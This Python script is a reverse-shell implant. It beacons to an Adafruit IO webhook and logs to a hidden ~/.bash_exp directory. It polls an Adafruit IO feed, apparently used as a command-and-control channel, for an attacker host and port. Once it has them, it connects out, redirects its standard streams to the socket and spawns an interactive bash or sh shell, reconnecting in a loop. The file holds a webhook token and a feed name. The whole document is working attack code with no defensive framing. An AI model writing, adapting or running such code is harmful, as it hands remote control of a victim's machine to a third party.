# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "requests",
# ]
# ///

import os
import pty
import time
import socket
import requests

DELAY = 10
TIME = str(int(time.time()))

LOG_DIR = os.path.expanduser("~/.bash_exp")
LOG = LOG_DIR + "/log-" + TIME
os.makedirs(LOG_DIR, exist_ok=True)

URL_POST = "https://io.adafruit.com/api/v2/webhooks/feed/VDTwYfHtVeSmB1GkJjcoqS62sYJu"
URL_GET = "https://io.adafruit.com/api/v2/naxa/feeds/host-port"


def log(message: str):
    with open(LOG, "a") as f:
        f.write(message + "\n")

    requests.post(
        URL_POST,
        data={"value": TIME + "-" + message},
    )


def main():
    log("start")

    while True:
        address = requests.get(URL_GET).json()["last_value"].split(":")

        if len(address) == 3 and all(address) and address[0] == TIME:
            address = (str(address[1]), int(address[2]))
            break

        log("loop: address")
        time.sleep(DELAY * 6 * 5)

    log(f"address: {address}")

    while True:
        log("loop: connect")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(address)

                log("connect")

                for fd in (0, 1, 2):
                    os.dup2(s.fileno(), fd)

                try:
                    pty.spawn("bash")

                except:
                    pty.spawn("sh")

                log("disconnect")

                time.sleep(DELAY * 6)

        except:
            time.sleep(DELAY)


if __name__ == "__main__":
    main()
